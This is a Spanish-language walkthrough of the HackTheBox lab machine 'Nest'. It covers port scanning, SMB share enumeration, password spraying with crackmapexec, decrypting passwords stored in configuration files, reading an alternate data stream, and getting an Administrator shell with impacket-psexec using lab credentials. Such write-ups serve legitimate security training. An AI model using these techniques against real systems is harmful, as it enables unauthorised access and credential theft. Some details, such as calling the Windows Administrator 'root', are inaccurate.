---
description: '✍️ Autor: VbScrub🔍 Dificultad: Fácil 📅 Fecha de creación: 04/06/2020'
---

# Nest

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.178
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV -p- 10.10.10.178
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 445 (SMB):** El puerto 445/tcp está abierto y ejecutando el servicio `microsoft-ds?`, lo que indica la posible presencia de un servicio SMB en el sistema.
* **Puerto 4386 (unknown):** El puerto 4386/tcp también está abierto y ejecutando un servicio desconocido. Según el fingerprinting de respuesta, el servicio se identifica como `Reporting Service V1.2`, lo que sugiere que permite a los usuarios ejecutar consultas en bases de datos mediante el formato HQK. Entre los comandos disponibles se encuentran `LIST`, `SETDIR`, `RUNQUERY`, `DEBUG` y `HELP`. Esta funcionalidad podría representar un posible vector de ataque si el servicio no está correctamente asegurado.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p445,4386 -v 10.10.10.178
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ponemos el dominio en el `/etc/hosts`.

```bash
echo "10.10.10.178 nest.htb" >> /etc/hosts
```

Listamos recursos compartidos.

```bash
smbclient -L 10.10.10.178
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Listamos el contenido de los recursos compartidos.

```bash
smbclient \\\\nest.htb\\Users -N
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
smbclient \\\\nest.htb\\Data -N
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En la ruta `/Shared/Templates/HR` hay un archivo interesante.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tenemos unas credenciales por lo que con los usuarios descubiertos antes realizamos fuerza bruta.

```bash
crackmapexec smb nest.htb -u usuarios -p 'welcome2019' --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Intenté iniciar sesión con los tres usuarios y, al usar **TempUser**, obtuve un archivo, pero estaba vacío. Volví a acceder al recurso compartido **Data** como **TempUser** y descargué los archivos. Entre ellos, encontré un archivo llamado **RU\_Config.xml**.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En otro archivo (**config.xml**) encontramos también información.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Entramos donde **Carl**.

```bash
smbclient -U ./TempUser //10.10.10.178/Secure$
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Lo que estamos buscando es una línea del artículo que mencionamos antes, un algoritmo para descifrar el cifrado del archivo **RU\_Config.xml**. Quiero hacerlo rápido, así que voy a dotnetfiddle.net, realizar algunos ajustes al código y ejecutarlo con la contraseña cifrada que está en el archivo de configuración.

{% embed url="https://dotnetfiddle.net/" %}

El resultado es **xRxRxPANCAK3SxRxRx**. Bien, el usuario estaba claro, y ahora la contraseña está descifrada.

```
smbclient -U ./c.smith //10.10.10.178/Users
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos investigando para escalar a **root**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-24 110901.png" alt=""><figcaption></figcaption></figure>

{% embed url="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux?source=post_page-----125aa20f9fea---------------------------------------" %}

```bash
allinfo "Debug Mode Password.txt"
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos lo descargamos.

```
get "Debug Mode Password.txt":Password:$Data
```

Esto debería devolverte la contraseña en formato claro, que en este caso es **WBQ201953D8w**.

Con la contraseña obtenida, conéctate al servidor HQK:

```bash
debug WBQ201953D8w
```

Dentro del servidor, ejecuta el siguiente comando en el directorio LDAP para ver la configuración:

```bash
showquery 2
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Esto debería devolverte las credenciales del **Administrador** en formato cifrado. En el ejemplo, la contraseña es **yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=**.

```bash
echo "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=" | base64 --decode
```

Ejecuté el comando `file` sobre el archivo `HqKLdap.exe` y descubrí que es un ejecutable .NET. Lo copié a mi sistema Windows y lo abrí utilizando ILSpy. Dentro del archivo `HqKLdap`, en la sección `CR`, encontré la siguiente línea de código:

```csharp
return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
```

Reemplacé esta línea en el script de Nest y modifiqué el archivo `config.xml` con el nombre de usuario y la contraseña de "Administrator". Luego ejecuté el script y obtuve lo siguiente:

**Anterior:**

```
XtH4nkS4Pl4y1nGX
Administrator
```

**Nuevo:**

```
AJPcXFcqZ32B993fPwoHWA==
XtH4nkS4Pl4y1nGX
```

La contraseña obtenida es: `XtH4nkS4Pl4y1nGX`.

Ahora, intentemos obtener una shell utilizando la siguiente herramienta:

```bash
impacket-psexec Administrator:XtH4nkS4Pl4y1nGX@nest.htb
```

Con este comando, deberíamos obtener acceso como `Administrator`.

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

somos **root.**

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
